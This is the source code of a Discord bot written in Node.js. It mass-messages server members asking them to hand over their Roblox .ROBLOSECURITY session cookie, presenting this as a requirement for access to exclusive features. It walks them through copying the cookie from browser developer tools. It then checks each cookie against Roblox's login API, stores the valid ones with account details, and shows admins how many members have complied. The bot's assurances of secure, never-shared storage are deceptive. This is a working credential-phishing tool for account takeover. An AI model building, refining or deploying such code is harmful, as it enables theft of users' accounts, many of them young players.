require('dotenv').config();
const { Client, GatewayIntentBits, Partials, SlashCommandBuilder, REST, Routes, EmbedBuilder } = require('discord.js');
const axios = require('axios');

const TOKEN = process.env.DISCORD_BOT_TOKEN;
const CLIENT_ID = process.env.DISCORD_CLIENT_ID;
const GUILD_ID = process.env.DISCORD_GUILD_ID;

// Check for required environment variables
if (!TOKEN || !CLIENT_ID || !GUILD_ID) {
  console.error('❌ Missing required environment variables:');
  if (!TOKEN) console.error('  - DISCORD_BOT_TOKEN is not set');
  if (!CLIENT_ID) console.error('  - DISCORD_CLIENT_ID is not set');
  if (!GUILD_ID) console.error('  - DISCORD_GUILD_ID is not set');
  process.exit(1);
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildPresences,
    GatewayIntentBits.GuildMessageReactions,
  ],
  partials: [Partials.Channel],
});

// In-memory store for who sent cookies and who was DM'd
const userCookies = new Map();
const usersDMd = new Set();

// Create axios instance with better defaults
const robloxAPI = axios.create({
  timeout: 2000, // 2 second timeout
  headers: {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json',
  },
});

// Helper function to validate Roblox cookie with better error handling
async function validateRobloxCookie(cookie) {
  try {
    // Clean the cookie input
    const cleanCookie = cookie.replace(/^\.ROBLOSECURITY=/, '').trim();
    
    if (!cleanCookie) {
      return { valid: false, error: 'Empty cookie provided' };
    }

    // Try the authentication endpoint first
    const response = await robloxAPI.get('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        Cookie: `.ROBLOSECURITY=${cleanCookie}`,
      },
    });

    const data = response.data;
    
    // Validate response structure
    if (!data || typeof data.id !== 'number' || !data.name) {
      return { valid: false, error: 'Invalid response from Roblox API' };
    }

    // Additional validation - check if account is banned or restricted
    if (data.isBanned) {
      return { valid: false, error: 'Account is banned' };
    }

    return { 
      valid: true, 
      data: {
        id: data.id,
        name: data.name,
        displayName: data.displayName,
        hasVerifiedBadge: data.hasVerifiedBadge,
        created: data.created
      }, 
      cleanCookie 
    };

  } catch (error) {
    console.error('Cookie validation error:', error.message);
    
    if (error.code === 'ECONNABORTED') {
      return { valid: false, error: 'Connection timeout - Roblox servers may be slow' };
    }
    
    if (error.response) {
      const status = error.response.status;
      switch (status) {
        case 401:
          return { valid: false, error: 'Invalid or expired cookie' };
        case 403:
          return { valid: false, error: 'Account restricted or cookie invalid' };
        case 429:
          return { valid: false, error: 'Too many requests - please try again later' };
        case 500:
        case 502:
        case 503:
          return { valid: false, error: 'Roblox servers are down - try again later' };
        default:
          return { valid: false, error: `API error: ${status}` };
      }
    }
    
    if (error.code === 'ENOTFOUND' || error.code === 'ECONNREFUSED') {
      return { valid: false, error: 'Cannot connect to Roblox - network issue' };
    }
    
    return { valid: false, error: 'Unknown error occurred' };
  }
}

// Async function to handle cookie validation without blocking Discord interaction
async function handleCookieValidation(interaction, cookie, isTest = false) {
  try {
    const validation = await validateRobloxCookie(cookie);
    
    if (!validation.valid) {
      const embed = new EmbedBuilder()
        .setColor('#ff0000')
        .setTitle('❌ Invalid Cookie')
        .setDescription(validation.error)
        .addFields(
          { name: 'What to do:', value: '• Make sure you copied the full cookie\n• Check if your Roblox session is still active\n• Try logging out and back into Roblox' }
        )
        .setTimestamp();
      
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    if (isTest) {
      // For test command, show detailed info
      const embed = new EmbedBuilder()
        .setColor('#00ff00')
        .setTitle('✅ Valid Cookie')
        .setDescription(`Successfully authenticated as **${validation.data.name}**`)
        .addFields(
          { name: 'User ID', value: validation.data.id.toString(), inline: true },
          { name: 'Display Name', value: validation.data.displayName || 'None', inline: true },
          { name: 'Verified', value: validation.data.hasVerifiedBadge ? '✅' : '❌', inline: true },
          { name: 'Account Created', value: validation.data.created ? new Date(validation.data.created).toLocaleDateString() : 'Unknown', inline: true }
        )
        .setTimestamp();
      
      await interaction.editReply({ embeds: [embed] });
    } else {
      // For submit command, store and confirm
      userCookies.set(interaction.user.id, {
        cookie: validation.cleanCookie,
        robloxData: validation.data,
        submittedAt: new Date()
      });

      const embed = new EmbedBuilder()
        .setColor('#00ff00')
        .setTitle('✅ Cookie Stored Successfully')
        .setDescription(`Your cookie has been validated and stored securely!`)
        .addFields(
          { name: 'Authenticated as:', value: `**${validation.data.name}** (${validation.data.id})`, inline: false },
          { name: 'Status:', value: 'You now have access to exclusive features!', inline: false }
        )
        .setFooter({ text: 'Your cookie is stored securely and never shared.' })
        .setTimestamp();
      
      await interaction.editReply({ embeds: [embed] });
    }

  } catch (error) {
    console.error('Unexpected error in handleCookieValidation:', error);
    
    const embed = new EmbedBuilder()
      .setColor('#ff0000')
      .setTitle('❌ Unexpected Error')
      .setDescription('Something went wrong while processing your cookie. Please try again.')
      .setTimestamp();
    
    await interaction.editReply({ embeds: [embed] });
  }
}

// Register slash commands
const commands = [
  new SlashCommandBuilder()
    .setName('testcookie')
    .setDescription('Test if a Roblox cookie is valid')
    .addStringOption(option =>
      option.setName('cookie')
        .setDescription('Your Roblox .ROBLOSECURITY cookie')
        .setRequired(true))
    .toJSON(),
  new SlashCommandBuilder()
    .setName('submitcookie')
    .setDescription('Submit your Roblox .ROBLOSECURITY cookie securely')
    .addStringOption(option =>
      option.setName('cookie')
        .setDescription('Your Roblox .ROBLOSECURITY cookie')
        .setRequired(true))
    .toJSON(),
  new SlashCommandBuilder()
    .setName('cookiehelp')
    .setDescription('Get help on how to find your Roblox cookie')
    .toJSON(),
];

const rest = new REST({ version: '10' }).setToken(TOKEN);

(async () => {
  try {
    console.log('🔄 Started refreshing application (/) commands.');
    await rest.put(
      Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID),
      { body: commands },
    );
    console.log('✅ Successfully reloaded application (/) commands.');
  } catch (error) {
    console.error('❌ Failed to reload commands:', error);
  }
})();

client.once('ready', async () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  console.log(`📊 Serving ${client.guilds.cache.size} guilds`);
});

// Helper to send DM for cookie request
async function requestCookieFromUser(user) {
  try {
    if (!user || usersDMd.has(user.id)) return;

    const embed = new EmbedBuilder()
      .setColor('#0099ff')
      .setTitle('🍪 Cookie Required for Access')
      .setDescription('Hi! To access exclusive server features, please submit your Roblox cookie.')
      .addFields(
        { name: 'How to submit:', value: 'Use `/submitcookie <your_cookie>` in the server', inline: false },
        { name: 'Need help?', value: 'Use `/cookiehelp` for instructions on finding your cookie', inline: false }
      )
      .setFooter({ text: 'Your cookie is validated and stored securely.' })
      .setTimestamp();

    await user.send({ embeds: [embed] });
    usersDMd.add(user.id);
    console.log(`📨 Sent cookie request to ${user.tag}`);

  } catch (error) {
    console.warn(`⚠️ Could not DM user ${user.tag}:`, error.message);
  }
}

client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;

  // Immediately defer all interactions to prevent timeout
  await interaction.deferReply({ ephemeral: true });

  try {
    switch (interaction.commandName) {
      case 'testcookie':
        const testCookie = interaction.options.getString('cookie');
        await handleCookieValidation(interaction, testCookie, true);
        break;

      case 'submitcookie':
        const submitCookie = interaction.options.getString('cookie');
        await handleCookieValidation(interaction, submitCookie, false);
        break;

      case 'cookiehelp':
        const helpEmbed = new EmbedBuilder()
          .setColor('#0099ff')
          .setTitle('🍪 How to Find Your Roblox Cookie')
          .setDescription('Follow these steps to get your .ROBLOSECURITY cookie:')
          .addFields(
            { name: '1. Open Browser', value: 'Use Chrome, Firefox, or Edge', inline: false },
            { name: '2. Go to Roblox', value: 'Navigate to https://roblox.com and log in', inline: false },
            { name: '3. Open Developer Tools', value: 'Press F12 or right-click → Inspect Element', inline: false },
            { name: '4. Go to Application/Storage Tab', value: 'Look for "Application" or "Storage" tab', inline: false },
            { name: '5. Find Cookies', value: 'Go to Cookies → https://roblox.com', inline: false },
            { name: '6. Copy .ROBLOSECURITY', value: 'Find the cookie named ".ROBLOSECURITY" and copy its value', inline: false }
          )
          .addFields(
            { name: '⚠️ Important:', value: '• Never share your cookie with anyone else\n• Only use it in this server\n• Log out of Roblox if you suspect compromise', inline: false }
          )
          .setFooter({ text: 'Need more help? Ask a server admin!' })
          .setTimestamp();
        
        await interaction.editReply({ embeds: [helpEmbed] });
        break;
    }
  } catch (error) {
    console.error(`❌ Error handling ${interaction.commandName}:`, error);
    
    const errorEmbed = new EmbedBuilder()
      .setColor('#ff0000')
      .setTitle('❌ Command Error')
      .setDescription('An unexpected error occurred. Please try again or contact an admin.')
      .setTimestamp();
    
    try {
      await interaction.editReply({ embeds: [errorEmbed] });
    } catch (e) {
      console.error('Failed to send error message:', e);
    }
  }
});

// Auto-request cookies from new members
client.on('guildMemberAdd', async member => {
  if (!member.user.bot && !userCookies.has(member.id)) {
    // Add small delay to avoid rate limits
    setTimeout(() => requestCookieFromUser(member.user), 1000);
  }
});

// Admin commands
client.on('messageCreate', async message => {
  if (!message.member?.permissions.has('Administrator')) return;

  if (message.content === '!checkcookies') {
    try {
      const guild = message.guild;
      await message.channel.send('🔄 Checking members without cookies...');
      
      const members = await guild.members.fetch();
      let count = 0;
      
      for (const member of members.values()) {
        if (!member.user.bot && !userCookies.has(member.id)) {
          await requestCookieFromUser(member.user);
          count++;
          // Add delay to prevent rate limiting
          if (count % 5 === 0) {
            await new Promise(resolve => setTimeout(resolve, 1000));
          }
        }
      }
      
      message.channel.send(`📨 Sent cookie requests to ${count} members.`);
    } catch (error) {
      console.error('Error in !checkcookies:', error);
      message.channel.send('❌ Error occurred while checking cookies.');
    }
  }

  if (message.content === '!cookiestatus') {
    try {
      const validCookies = userCookies.size;
      const guild = message.guild;
      const totalMembers = guild.memberCount - guild.members.cache.filter(m => m.user.bot).size;
      const percentage = totalMembers > 0 ? ((validCookies / totalMembers) * 100).toFixed(1) : 0;
      
      const embed = new EmbedBuilder()
        .setColor('#0099ff')
        .setTitle('📊 Cookie Status Report')
        .addFields(
          { name: '✅ Valid Cookies', value: validCookies.toString(), inline: true },
          { name: '👥 Total Members', value: totalMembers.toString(), inline: true },
          { name: '📈 Coverage', value: `${percentage}%`, inline: true }
        )
        .setTimestamp();
      
      message.channel.send({ embeds: [embed] });
    } catch (error) {
      console.error('Error in !cookiestatus:', error);
      message.channel.send('❌ Error occurred while getting status.');
    }
  }
});

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('🛑 Shutting down bot...');
  client.destroy();
  process.exit(0);
});

process.on('unhandledRejection', (error) => {
  console.error('❌ Unhandled promise rejection:', error);
});

client.login(TOKEN);
